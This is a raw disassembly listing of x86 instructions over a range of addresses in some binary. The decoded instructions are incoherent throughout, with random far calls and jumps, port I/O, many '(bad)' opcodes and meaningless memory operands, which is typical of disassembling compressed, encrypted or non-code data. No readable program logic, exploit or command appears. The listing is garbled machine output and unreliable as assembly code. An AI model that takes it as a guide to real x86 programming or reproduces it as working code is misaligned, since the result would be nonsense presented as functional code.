  42a96e:	rcl    DWORD PTR [ebx+0x2ce83e38],0xaf
  42a975:	mov    al,0x20
  42a977:	sub    BYTE PTR [edx],dh
  42a979:	add    esp,DWORD PTR [edi+esi*2-0x4f]
  42a97d:	aam    0xaf
  42a97f:	cmp    BYTE PTR [edi+eiz*8-0x2cf1fe18],dl
  42a986:	shl    BYTE PTR [ebx-0x942e017],1
  42a98c:	outs   dx,DWORD PTR ds:[esi]
  42a98d:	xchg   esi,eax
  42a98e:	pop    ebp
  42a98f:	dec    eax
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	mov    eax,ds:0xa4df908c
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    al,al
  42aa0d:	dec    ebx
  42aa0e:	mov    bl,0x44
  42aa10:	int3   
  42aa11:	sbb    dh,BYTE PTR [ebp+0x21f5a9b5]
  42aa17:	xchg   edx,eax
  42aa18:	xchg   edi,eax
  42aa19:	pop    ds
  42aa1a:	es cwde 
  42aa1c:	adc    BYTE PTR ds:0x72ef03f4,dl
  42aa22:	sbb    al,dh
  42aa24:	fidiv  WORD PTR [edx+0x4c]
  42aa27:	xchg   esi,eax
  42aa28:	cdq    
  42aa29:	iret   
  42aa2a:	enter  0xff3a,0x9e
  42aa2e:	arpl   WORD PTR [ebx-0x5a],di
  42aa31:	inc    edi
  42aa32:	dec    edx
  42aa33:	fs jb  0x42aa78
  42aa36:	dec    ecx
  42aa37:	xchg   esi,eax
  42aa38:	inc    esp
  42aa39:	xchg   ecx,eax
  42aa3a:	lahf   
  42aa3b:	int    0x2c
  42aa3d:	clc    
  42aa3e:	mov    cl,0x2a
  42aa40:	sbb    eax,0x1ff2e6e2
  42aa45:	stos   BYTE PTR es:[edi],al
  42aa46:	test   BYTE PTR [ecx-0x58c16c85],ah
  42aa4c:	push   edi
  42aa4d:	pusha  
  42aa4e:	jecxz  0x42aaa3
  42aa50:	retf   
  42aa51:	inc    eax
  42aa52:	mov    cl,ah
  42aa54:	ins    BYTE PTR es:[edi],dx
  42aa55:	pop    ds
  42aa56:	add    DWORD PTR [esi],eax
  42aa58:	jp     0x42aa64
  42aa5a:	repz cmp BYTE PTR [eax+0x1986e590],bh
  42aa61:	call   0x5255646a
  42aa66:	pop    edx
  42aa67:	aad    0x4c
  42aa69:	imul   ebx,DWORD PTR ds:0x961e9f34,0xe3e47c0
  42aa73:	pop    ecx
  42aa74:	adc    al,0x96
  42aa76:	mov    ebp,0x350b38c5
  42aa7b:	int    0x40
  42aa7d:	mov    BYTE PTR [ecx+edi*4-0x655c25bc],bl
  42aa84:	dec    ebx
  42aa85:	fcmovu st,st(4)
  42aa87:	ins    BYTE PTR es:[edi],dx
  42aa88:	(bad)  
  42aa89:	mov    ah,0xb5
  42aa8b:	xlat   BYTE PTR ds:[ebx]
  42aa8c:	sahf   
  42aa8d:	and    BYTE PTR [edx+0x525c3b24],cl
  42aa93:	fisub  WORD PTR [edi+0x54]
  42aa96:	xchg   edi,eax
  42aa97:	leave  
  42aa98:	mov    ecx,0xcaad6b78
  42aa9d:	xor    al,0x2e
  42aa9f:	pop    ss
  42aaa0:	mov    al,ds:0xf18079bc
  42aaa5:	les    edx,FWORD PTR [eax-0x62]
  42aaa8:	imul   ebp,edi,0xabfd2289
  42aaae:	retf   0xad22
  42aab1:	inc    ecx
  42aab2:	jg     0x42aa6a
  42aab4:	out    0x98,ax
  42aab7:	test   DWORD PTR [ecx],edx
  42aab9:	shl    BYTE PTR [esp+ebx*4+0x59],cl
  42aabd:	out    0x14,al
  42aabf:	mov    ch,BYTE PTR [eax-0x47]
  42aac2:	lods   al,BYTE PTR ds:[esi]
  42aac3:	sub    al,BYTE PTR [esi-0x2e3d7ef1]
  42aac9:	xlat   BYTE PTR ds:[ebx]
  42aaca:	(bad)  
  42aacb:	in     al,dx
  42aacc:	mov    cl,0xd2
  42aace:	addr16 push esi
  42aad0:	cli    
  42aad1:	lds    edx,FWORD PTR [esi+eax*4+0x66656bf0]
  42aad8:	cli    
  42aad9:	cli    
  42aada:	mov    ds:0x2a6959b1,al
  42aadf:	or     ah,bh
  42aae1:	ret    
  42aae2:	xchg   ecx,eax
  42aae3:	sbb    edx,DWORD PTR [ecx-0x1d]
  42aae6:	mov    dl,0x89
  42aae8:	lods   al,BYTE PTR ds:[esi]
  42aae9:	es dec ebp
  42aaeb:	stc    
  42aaec:	mov    eax,ds:0xf1c674df
  42aaf1:	or     al,0xea
  42aaf3:	(bad)  
  42aaf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aaf5:	cmp    esi,DWORD PTR ds:[ebp-0x56]
  42aaf9:	(bad)  
  42aafa:	shr    DWORD PTR [ecx+0x13],1
  42aafd:	or     al,0xef
  42aaff:	bound  edx,QWORD PTR [edx-0x2c]
  42ab02:	and    DWORD PTR [esi-0x2e6a3c5],eax
  42ab08:	popf   
  42ab09:	pop    ss
  42ab0a:	jmp    0xbc90544b
  42ab0f:	pop    esp
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	aam    0x32
  42ab82:	out    dx,eax
  42ab83:	xor    ch,BYTE PTR [eax+0x40001c8]
  42ab89:	add    DWORD PTR [eax],eax
  42ab8b:	add    BYTE PTR [esi-0x1e],dh
  42ab8e:	out    0xd7,al
  42ab90:	xchg   edx,eax
  42ab91:	int    0x25
  42ab93:	jb     0x42abf0
  42ab95:	push   0x63617d02
  42ab9a:	sbb    al,bl
  42ab9c:	xchg   edx,eax
  42ab9d:	push   edi
  42ab9e:	push   cs
  42ab9f:	push   0xc9cf952a
  42aba4:	xchg   esp,eax
  42aba5:	int    0xf6
  42aba7:	ret    
  42aba8:	jo     0x42ab5e
  42abaa:	fcmovne st,st(2)
  42abac:	aas    
  42abad:	pop    edx
  42abae:	inc    ebx
  42abaf:	call   0xbfb5:0xc1a2ff45
  42abb6:	cli    
  42abb7:	mov    esp,0xa7e9e332
  42abbc:	add    BYTE PTR [edx+eiz*1],0x18
  42abc0:	xchg   esp,eax
  42abc1:	dec    ebx
  42abc2:	jbe    0x42ab76
  42abc4:	push   ebx
  42abc5:	mov    esi,DWORD PTR [ecx+0x26c25937]
  42abcb:	fisub  DWORD PTR [esi+0x69]
  42abce:	or     ebx,DWORD PTR [ebp-0x4f]
  42abd1:	sub    al,BYTE PTR [ebx*8-0x133e4766]
  42abd8:	sub    dl,dl
  42abda:	repnz test al,0xc5
  42abdd:	lock stos BYTE PTR es:[edi],al
  42abdf:	sbb    eax,ecx
  42abe1:	cmp    eax,0x27f1f43a
  42abe6:	ins    BYTE PTR es:[edi],dx
  42abe7:	sbb    ebp,DWORD PTR [ecx-0x6723bcf4]
  42abed:	loop   0x42ac5b
  42abef:	jnp    0x42ac2d
  42abf1:	and    BYTE PTR [edx],0xc5
  42abf4:	cli    
  42abf5:	adc    al,0xf1
  42abf7:	push   0xaec4892
  42abfc:	dec    ebx
  42abfd:	mov    ds:0xbada9fb4,al
  42ac02:	shl    DWORD PTR [ebp-0x6],cl
  42ac05:	test   DWORD PTR [eax],0x8203e6c4
  42ac0b:	mov    ds:0xeaef93cd,al
  42ac10:	inc    edx
  42ac11:	mov    ds:0x36b7e66a,al
  42ac16:	dec    ecx
  42ac17:	xchg   esp,eax
  42ac18:	pop    edx
  42ac19:	outs   dx,DWORD PTR ds:[esi]
  42ac1a:	xor    ecx,edi
  42ac1c:	lods   al,BYTE PTR ds:[esi]
  42ac1d:	push   esi
  42ac1e:	push   edi
  42ac1f:	sar    DWORD PTR [ebx+0x4f],1
  42ac22:	xor    DWORD PTR [ebx+0x3d],ecx
  42ac25:	ss clc 
  42ac27:	inc    edi
  42ac28:	gs (bad) 
  42ac2a:	(bad)  
  42ac2b:	push   DWORD PTR [ecx]
  42ac2d:	cmp    DWORD PTR [edi],0xf411bf5a
  42ac33:	add    al,0x27
  42ac35:	adc    DWORD PTR [edi+0x28f64a61],0xffffffa4
  42ac3c:	(bad)  
  42ac3d:	out    dx,al
  42ac3e:	stos   BYTE PTR es:[edi],al
  42ac3f:	std    
  42ac40:	mov    al,0x3c
  42ac42:	push   edi
  42ac43:	ins    BYTE PTR es:[edi],dx
  42ac44:	or     dl,dl
  42ac46:	pop    eax
  42ac47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac48:	(bad)  
  42ac49:	cli    
  42ac4a:	sbb    BYTE PTR [esi-0x334dd754],al
  42ac50:	out    dx,eax
  42ac51:	dec    edx
  42ac52:	loopne 0x42ac9e
  42ac54:	sub    BYTE PTR [esi],ch
  42ac56:	enter  0x274f,0x98
  42ac5a:	rcl    BYTE PTR [eax],cl
  42ac5c:	dec    eax
  42ac5d:	add    DWORD PTR ds:0xcd4925b4,esp
  42ac63:	adc    ebx,DWORD PTR [bx]
  42ac66:	in     al,0x77
  42ac68:	push   esp
  42ac69:	xor    BYTE PTR [edx],0x63
  42ac6c:	fild   DWORD PTR [ecx+0x44]
  42ac6f:	fsub   st(3),st
  42ac71:	sti    
  42ac72:	mov    ds:0x54a44a03,eax
  42ac77:	out    0x38,eax
  42ac79:	dec    edi
  42ac7a:	and    al,0x27
  42ac7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac7e:	mov    esi,DWORD PTR [edx+0x73b66e53]
  42ac84:	mov    eax,ds:0x6baf6df3
  42ac89:	(bad)  
  42ac8a:	jno    0x42ac60
  42ac8c:	mov    esi,0xa8170
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	push   ebp
  42ad01:	ficomp WORD PTR [edx-0x56]
  42ad04:	lods   al,BYTE PTR ds:[esi]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	dec    edi
  42ad0d:	shr    BYTE PTR [edi+0x71d7bcf3],cl
  42ad13:	or     edx,ebx
  42ad15:	sub    BYTE PTR [ebp+0x3bb2e9ca],al
  42ad1b:	mov    dh,0x56
  42ad1d:	shl    BYTE PTR [edx+edi*4-0xf631d53],1
  42ad24:	xor    esp,esi
  42ad26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad27:	and    dh,BYTE PTR [esi]
  42ad29:	pop    ds
  42ad2a:	mov    ds:0xd6de555e,eax
  42ad2f:	ja     0x42acd7
  42ad31:	outs   dx,BYTE PTR ds:[esi]
  42ad32:	push   es
  42ad33:	call   0x10a3eb26
  42ad38:	xchg   esp,eax
  42ad39:	aam    0x9
  42ad3b:	idiv   esi
  42ad3d:	in     eax,dx
  42ad3e:	dec    edi
  42ad3f:	shl    ch,cl
  42ad41:	lock pusha 
  42ad43:	dec    ecx
  42ad44:	xor    bl,dh
  42ad46:	stos   BYTE PTR es:[edi],al
  42ad47:	scas   al,BYTE PTR es:[edi]
  42ad48:	adc    BYTE PTR [eax-0x4f],0xfb
  42ad4c:	add    BYTE PTR [edx],bl
  42ad4e:	cmp    eax,0x1b740fc5
  42ad53:	aaa    
  42ad54:	call   esp
  42ad56:	data16 jl 0x42adb3
  42ad59:	call   0x203844f3
  42ad5e:	lods   al,BYTE PTR ds:[esi]
  42ad5f:	fld    TBYTE PTR [edx-0x73]
  42ad62:	out    0x36,eax
  42ad64:	out    0xcf,al
  42ad66:	enter  0x859a,0xc6
  42ad6a:	imul   eax,DWORD PTR [esi-0x4b9b7520],0x6ae1eedc
  42ad74:	popa   
  42ad75:	out    dx,al
  42ad76:	push   esi
  42ad77:	(bad)  
  42ad78:	je     0x42ad12
  42ad7a:	cmp    bl,BYTE PTR [ebx+0x4baf8e84]
  42ad80:	xchg   edx,eax
  42ad81:	sub    eax,0x4073d4fb
  42ad86:	push   es
  42ad87:	sti    
  42ad88:	mul    bh
  42ad8a:	mov    al,ds:0xec3297f6
  42ad8f:	in     al,dx
  42ad90:	jno    0x42adcc
  42ad92:	jo     0x42adf2
  42ad94:	ja     0x42ad90
  42ad96:	fs xchg ecx,eax
  42ad98:	xchg   ebx,eax
  42ad99:	in     al,dx
  42ad9a:	inc    esi
  42ad9b:	push   0xd337d0c0
  42ada0:	cmp    dl,BYTE PTR [edi-0x63edf6ee]
  42ada6:	and    dh,BYTE PTR ds:0x2d7b11b2
  42adac:	cmp    ch,dl
  42adae:	push   ebx
  42adaf:	in     eax,dx
  42adb0:	sbb    edi,DWORD PTR [eax]
  42adb2:	or     BYTE PTR [esi+0x10],dh
  42adb5:	cdq    
  42adb6:	mov    bl,0x7f
  42adb8:	sahf   
  42adb9:	pop    ebp
  42adba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adbb:	xchg   BYTE PTR [edx-0x2c],al
  42adbe:	jb     0x42ae00
  42adc0:	mov    eax,ds:0x515d1281
  42adc5:	sahf   
  42adc6:	xor    eax,0x56c31536
  42adcb:	shl    DWORD PTR [ebp+ecx*8+0x5],0x52
  42add0:	aas    
  42add1:	pop    esp
  42add2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42add3:	jnp    0x42ad8c
  42add5:	lea    edi,[edx+0x1c146073]
  42addb:	mov    esp,0xc53e82e8
  42ade0:	xchg   ebx,eax
  42ade1:	lock lds ecx,FWORD PTR [eax+0x62]
  42ade5:	enter  0x7edf,0x2b
  42ade9:	je     0x42ae5e
  42adeb:	and    eax,0xb2dd5591
  42adf0:	js     0x42adcd
  42adf2:	pop    eax
  42adf3:	lods   eax,DWORD PTR ds:[esi]
  42adf4:	push   cs
  42adf5:	daa    
  42adf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adf7:	sub    edi,edi
  42adf9:	cld    
  42adfa:	mov    dl,0x2d
  42adfc:	pusha  
  42adfd:	inc    eax
  42adfe:	and    eax,0xc6a0a1fa
  42ae03:	loopne 0x42ae15
  42ae05:	(bad)  
  42ae07:	jb     0x42adcd
  42ae09:	push   cs
  42ae0a:	inc    esi
  42ae0b:	pop    ecx
  42ae0c:	(bad)  
  42ae0d:	ins    DWORD PTR es:[edi],dx
  42ae0e:	aas    
  42ae0f:	jp     0x42ae11
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	stc    
  42ae81:	sub    eax,0xcab08a73
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	(bad)  
  42ae8d:	rol    DWORD PTR [esi+0x50],cl
  42ae90:	and    BYTE PTR [eax],ah
  42ae92:	inc    ecx
  42ae93:	jno    0x42aefa
  42ae95:	ins    DWORD PTR es:[edi],dx
  42ae96:	mov    al,BYTE PTR [edi+ebp*2-0x75]
  42ae9a:	neg    ah
  42ae9c:	pushf  
  42ae9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae9e:	xchg   esp,eax
  42ae9f:	in     al,dx
  42aea0:	fstp   DWORD PTR [esi]
  42aea2:	pop    ecx
  42aea3:	mov    edi,0x3772bfe9
  42aea8:	push   ss
  42aea9:	retf   
  42aeaa:	outs   dx,BYTE PTR ds:[esi]
  42aeab:	mov    al,0x4a
  42aead:	and    al,0x1d
  42aeaf:	and    ebp,DWORD PTR [ecx-0x851cf5f]
  42aeb5:	pop    es
  42aeb6:	or     eax,ecx
  42aeb8:	add    cl,BYTE PTR [ebp+0xb]
  42aebb:	in     eax,dx
  42aebc:	mov    ss,edx
  42aebe:	out    0x90,al
  42aec0:	fnstcw WORD PTR [esi]
  42aec2:	pusha  
  42aec3:	pop    ebp
  42aec4:	std    
  42aec5:	add    BYTE PTR [esi-0x1d4f141f],cl
  42aecb:	inc    edx
  42aecc:	mov    ch,0x75
  42aece:	mov    edi,0xa0f77ae8
  42aed3:	(bad)  
  42aed4:	mov    ch,0x6b
  42aed6:	mov    esi,0xef90ea
  42aedb:	sti    
  42aedc:	mov    edi,0x52ec5c4f
  42aee1:	fldcw  WORD PTR [esi]
  42aee3:	jecxz  0x42ae81
  42aee5:	fadd   QWORD PTR [edi-0xd249d3f]
  42aeeb:	pop    ds
  42aeec:	jb     0x42af6a
  42aeee:	adc    eax,0x28d0a92d
  42aef3:	lock pushf 
  42aef5:	arpl   WORD PTR [edx+0x6c55ddf0],di
  42aefb:	pop    ds
  42aefc:	lahf   
  42aefd:	add    BYTE PTR [esi+0x69282fa7],dl
  42af03:	je     0x42aed5
  42af05:	cmp    ch,dl
  42af07:	push   edi
  42af08:	fistp  QWORD PTR [ebp-0x2a]
  42af0b:	outs   dx,DWORD PTR ds:[esi]
  42af0c:	lods   al,BYTE PTR ds:[esi]
  42af0d:	rcr    ecx,1
  42af0f:	into   
  42af10:	mov    bh,bh
  42af12:	mov    bl,0xe3
  42af14:	pop    ebx
  42af15:	loope  0x42af82
  42af17:	or     al,0x2f
  42af19:	aaa    
  42af1a:	outs   dx,BYTE PTR ds:[esi]
  42af1b:	into   
  42af1c:	test   BYTE PTR [edi+0x25cc6321],ch
  42af22:	add    DWORD PTR [edx],edx
  42af24:	xchg   esi,esp
  42af26:	stc    
  42af27:	push   esi
  42af28:	call   0x68c1ae3b
  42af2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af2e:	lahf   
  42af2f:	push   eax
  42af30:	sbb    DWORD PTR [ecx],esp
  42af32:	addr16 gs call 0x82b0:0xdbe19f61
  42af3b:	bound  edx,QWORD PTR [ebx-0x6b]
  42af3e:	sbb    bl,al
  42af40:	add    dh,ch
  42af42:	loope  0x42aee4
  42af44:	xor    ebx,DWORD PTR [esi+0x79]
  42af47:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af49:	les    esi,FWORD PTR [ecx]
  42af4b:	sub    dl,cl
  42af4d:	mov    ebx,0x273d6068
  42af52:	stc    
  42af53:	popa   
  42af54:	fsub   st,st(1)
  42af56:	adc    eax,0x550c2e80
  42af5b:	int3   
  42af5c:	push   esp
  42af5d:	mov    al,0x46
  42af5f:	push   ss
  42af60:	enter  0xed15,0x15
  42af64:	mov    al,0x2b
  42af66:	rol    DWORD PTR [esi+0x20],cl
  42af69:	xchg   edx,eax
  42af6a:	pop    ebx
  42af6b:	fs pushf 
  42af6d:	sbb    al,0x24
  42af6f:	into   
  42af70:	es fsub st,st(0)
  42af73:	push   esp
  42af74:	popf   
  42af75:	shr    BYTE PTR [esi-0x5d42b40a],1
  42af7b:	xor    bh,BYTE PTR [eax+0x5b753fdc]
  42af81:	jo     0x42afb8
  42af83:	pushf  
  42af84:	loop   0x42afc3
  42af86:	and    al,al
  42af88:	pop    ecx
  42af89:	scas   al,BYTE PTR es:[edi]
  42af8a:	ret    0xc417
  42af8d:	test   bh,ah
  42af8f:	xchg   ebx,eax
	...
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	mov    ch,BYTE PTR [eax+0x64]
  42b003:	sub    esi,DWORD PTR [ebx+ecx*8+0x1040001]
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	retf   
  42b00d:	mov    ch,BYTE PTR [edi]
  42b00f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b010:	mov    ebp,0x1cec1990
  42b016:	lahf   
  42b017:	imul   edx,DWORD PTR ds:0x92eb8633,0x1ba321de
  42b021:	sbb    ecx,DWORD PTR [ebx+0x52]
  42b024:	aas    
  42b025:	shl    BYTE PTR [edi],cl
  42b027:	rol    BYTE PTR [ebx-0xcf04d06],cl
  42b02d:	jnp    0x42b038
  42b02f:	pop    edi
  42b030:	and    edi,DWORD PTR [ebp-0x7c]
  42b033:	aam    0x4
  42b035:	loope  0x42b077
  42b037:	js     0x42afba
  42b039:	sub    BYTE PTR [esi+0x1a],ah
  42b03c:	popa   
  42b03d:	cmp    al,0xf4
  42b03f:	cli    
  42b040:	lds    ebp,FWORD PTR [ecx-0x9f92ba5]
  42b046:	rcr    BYTE PTR [ecx],cl
  42b048:	jmp    0x1c3d:0x80e352b6
  42b04f:	out    dx,eax
  42b050:	out    0xd7,al
  42b052:	test   BYTE PTR [eax+0x6e],bh
  42b055:	jne    0x42afdf
  42b057:	add    ch,BYTE PTR [edi+0x61]
  42b05a:	push   ecx
  42b05b:	sbb    bh,BYTE PTR [ebx-0x64]
  42b05e:	dec    eax
  42b05f:	sub    al,0xc4
  42b061:	jecxz  0x42aff5
  42b063:	call   0x4c0a:0x6429a96d
  42b06a:	pop    edx
  42b06b:	inc    BYTE PTR [esi+0x57]
  42b06e:	pop    esi
  42b06f:	pop    esp
  42b070:	sub    BYTE PTR [ebp+0x4f],ah
  42b073:	mov    cl,0xfa
  42b075:	(bad)  
  42b077:	mov    ch,0x7
  42b079:	xchg   edx,eax
  42b07a:	int3   
  42b07b:	mov    esp,0x5497c50e
  42b080:	mov    al,0xb5
  42b082:	dec    ebp
  42b083:	ds cmp eax,0x88a2df78
  42b089:	jbe    0x42b0bf
  42b08b:	cmp    BYTE PTR [eax],dh
  42b08d:	adc    cl,BYTE PTR [ebx]
  42b08f:	mov    ds:0x1644d85a,eax
  42b094:	jle    0x42b01a
  42b096:	dec    esi
  42b097:	jo     0x42b0b1
  42b099:	or     BYTE PTR [ebx+0x1c4924a6],dl
  42b09f:	lock pop ds
  42b0a1:	test   BYTE PTR [edx-0x64],cl
  42b0a4:	inc    BYTE PTR [edx-0x3a]
  42b0a7:	sbb    BYTE PTR [ebx+0x69e53759],ah
  42b0ad:	out    dx,eax
  42b0ae:	js     0x42b035
  42b0b0:	adc    ecx,DWORD PTR [esp+ebx*1]
  42b0b3:	ins    DWORD PTR es:[edi],dx
  42b0b4:	ds das 
  42b0b6:	call   0x3fb475f4
  42b0bb:	add    DWORD PTR [ecx-0x19],ebx
  42b0be:	pop    edx
  42b0bf:	outs   dx,DWORD PTR ds:[esi]
  42b0c0:	and    ecx,DWORD PTR [edi-0x2a]
  42b0c3:	loopne 0x42b056
  42b0c5:	jmp    0x42b05e
  42b0c7:	pop    edi
  42b0c8:	cmp    cl,0xe3
  42b0cb:	xor    dl,ah
  42b0cd:	and    ch,ch
  42b0cf:	mov    ecx,0x5f654b4
  42b0d4:	fldlg2 
  42b0d6:	push   ebp
  42b0d7:	test   eax,0x16ff53f5
  42b0dc:	cmc    
  42b0dd:	cdq    
  42b0de:	out    0xd7,eax
  42b0e0:	lods   eax,DWORD PTR ds:[esi]
  42b0e1:	xor    al,0x64
  42b0e3:	dec    edx
  42b0e4:	cdq    
  42b0e5:	mov    al,ah
  42b0e7:	and    DWORD PTR [esi],esp
  42b0e9:	mov    ch,al
  42b0eb:	jmp    0x42b10e
  42b0ed:	call   FWORD PTR ds:0xae51c5fc
  42b0f3:	pop    es
  42b0f4:	cmp    ebx,ecx
  42b0f6:	fcom   DWORD PTR [ecx+0x15f85378]
  42b0fc:	pop    ss
  42b0fd:	cdq    
  42b0fe:	push   ecx
  42b0ff:	jno    0x42b08e
  42b101:	jle    0x42b16e
  42b103:	test   eax,0x75db1b90
  42b108:	mov    ecx,0x9be134e0
  42b10d:	cmc    
  42b10e:	dec    ecx
  42b10f:	mov    ecx,0x0
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	or     DWORD PTR [ecx],0xffffff86
  42b183:	loop   0x42b13d
  42b185:	int3   
  42b186:	add    DWORD PTR [eax],eax
  42b188:	add    al,0x1
  42b18a:	add    BYTE PTR [eax],al
  42b18c:	push   esp
  42b18d:	jo     0x42b1db
  42b18f:	dec    esi
  42b190:	arpl   sp,dx
  42b192:	dec    edi
  42b193:	xchg   DWORD PTR [ecx*4-0x2da7dedf],ecx
  42b19a:	sbb    eax,0x18ca6a48
  42b19f:	lea    eax,[edi-0x7b]
  42b1a2:	mov    ebx,0x6b08df13
  42b1a7:	out    dx,al
  42b1a8:	lods   eax,DWORD PTR ds:[esi]
  42b1a9:	ficomp WORD PTR [eax+0x41e3ebac]
  42b1af:	dec    esi
  42b1b0:	test   al,0x16
  42b1b2:	mov    al,ds:0x3ecf27ba
  42b1b7:	jne    0x42b155
  42b1b9:	adc    eax,0x1cad9ab3
  42b1be:	xor    DWORD PTR ds:0x98e6c85,0x8c91e70c
  42b1c8:	and    ecx,DWORD PTR [ebp-0x7cff2e42]
  42b1ce:	outs   dx,BYTE PTR ds:[esi]
  42b1cf:	pop    edi
  42b1d0:	jge    0x42b23e
  42b1d2:	push   eax
  42b1d3:	ret    0xc1a1
  42b1d6:	aaa    
  42b1d7:	pushf  
  42b1d8:	cmp    al,0x49
  42b1da:	inc    edi
  42b1db:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42b1dd:	xchg   ecx,eax
  42b1de:	jmp    0x6e31:0x971e776c
  42b1e5:	loopne 0x42b263
  42b1e7:	std    
  42b1e8:	sbb    al,0xd6
  42b1ea:	and    ebp,0xffffffb9
  42b1ed:	add    eax,0x23972f61
  42b1f2:	inc    esi
  42b1f3:	lds    eax,FWORD PTR [esi-0x57]
  42b1f6:	mul    BYTE PTR [ecx]
  42b1f8:	aad    0x18
  42b1fa:	mov    ds:0x3e164d46,al
  42b1ff:	xchg   edi,eax
  42b200:	les    eax,FWORD PTR cs:[edx]
  42b203:	loope  0x42b1e9
  42b205:	fistp  WORD PTR [eax-0x6aad4689]
  42b20b:	cmp    al,0x2
  42b20d:	lods   eax,DWORD PTR ds:[esi]
  42b20e:	enter  0x942f,0x32
  42b212:	mov    ebx,0x984e4e18
  42b217:	mov    bl,0x32
  42b219:	adc    DWORD PTR [ebx-0x42],ebx
  42b21c:	out    0x3d,eax
  42b21e:	fist   WORD PTR [esi+eax*2]
  42b221:	stc    
  42b222:	pop    esi
  42b223:	and    eax,eax
  42b225:	cmc    
  42b226:	cmc    
  42b227:	outs   dx,DWORD PTR ds:[esi]
  42b228:	mov    edi,0xaf843b41
  42b22d:	aad    0xf6
  42b22f:	jge    0x42b274
  42b231:	mov    bh,0xaf
  42b233:	aaa    
  42b234:	and    DWORD PTR [ebx-0x60f48689],eax
  42b23a:	sub    BYTE PTR es:[esi+0x74433c62],bl
  42b241:	mov    ebp,0xc18d40ae
  42b246:	shl    DWORD PTR [ebx],1
  42b248:	jmp    0xba023c7a
  42b24d:	sbb    al,0xd6
  42b24f:	dec    edi
  42b250:	jecxz  0x42b2ba
  42b252:	or     DWORD PTR ds:[esi],edx
  42b255:	jo     0x42b274
  42b257:	aas    
  42b258:	dec    ecx
  42b259:	pop    si
  42b25b:	in     eax,dx
  42b25c:	(bad)  
  42b25e:	adc    dh,BYTE PTR ds:0x29abe670
  42b264:	je     0x42b251
  42b266:	aas    
  42b267:	xchg   ebx,eax
  42b268:	mov    esi,0x78c8222d
  42b26d:	pop    ds
  42b26e:	out    dx,al
  42b26f:	push   es
  42b270:	pop    edi
  42b271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b272:	inc    edx
  42b273:	push   esp
  42b274:	adc    dh,dh
  42b276:	fild   DWORD PTR [esi-0x45c0bb39]
  42b27c:	cwde   
  42b27d:	ds mov bh,0xaf
  42b280:	cmp    eax,0x7f1d2c5c
  42b285:	fwait
  42b286:	mov    al,ds:0x2025d925
  42b28b:	mov    ecx,0xbddc32f6
	...
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x1b738e65
  42b301:	xchg   ebp,eax
  42b302:	jp     0x42b2ca
  42b304:	mov    esp,0x40001cd
  42b309:	add    DWORD PTR [eax],eax
  42b30b:	add    BYTE PTR [ebx+0x64],dh
  42b30e:	shl    DWORD PTR [eax+0x7],cl
  42b311:	(bad)  
  42b313:	cmp    DWORD PTR [edi-0x48],esp
  42b316:	cli    
  42b317:	mov    edx,DWORD PTR [ecx+0x41f4a096]
  42b31d:	test   edi,edi
  42b31f:	and    esi,DWORD PTR [esi+0x22b0626c]
  42b325:	push   eax
  42b326:	mov    eax,ds:0x39b4ee7b
  42b32b:	sub    BYTE PTR [eax],ch
  42b32d:	jo     0x42b2c8
  42b32f:	in     al,dx
  42b330:	pop    es
  42b331:	(bad)  
  42b332:	jg     0x42b3a9
  42b334:	mov    ah,0x6e
  42b336:	call   0x51da:0x6ed322d9
  42b33d:	sbb    BYTE PTR [ebx],0xf1
  42b340:	xchg   DWORD PTR [edx+eax*8],edi
  42b343:	mov    edx,0x5dd3ef0f
  42b348:	push   0xd6c942df
  42b34d:	adc    BYTE PTR [eax],0x61
  42b350:	addr16 push 0x6c4c3869
  42b356:	fwait
  42b357:	and    al,0x5d
  42b359:	(bad)  
  42b35a:	cmc    
  42b35b:	add    BYTE PTR [eax+ebp*2-0x69],dh
  42b35f:	cmp    BYTE PTR [ebx-0x536e55f3],ch
